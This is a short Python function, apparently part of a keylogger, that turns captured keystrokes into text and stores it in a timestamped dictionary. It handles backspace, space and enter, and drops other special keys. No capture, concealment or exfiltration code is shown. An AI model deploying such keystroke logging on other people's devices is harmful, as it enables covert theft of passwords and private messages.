def write_file(keys):
    now = datetime.datetime.now().strftime("%d-%m-%y %H:%M ")
    data_str = ''
    for key in keys:
        k = str(key).replace("'", "")
        if 'backspace' in k:
            data_str = data_str[:-1]
        elif 'space' in k:
            data_str += ' '
        elif 'enter' in k:
            data_str += '\n'
        elif 'Key' not in k:
            data_str += k
    log_dict[now] = log_dict.get(now, '') + data_str
    print(log_dict)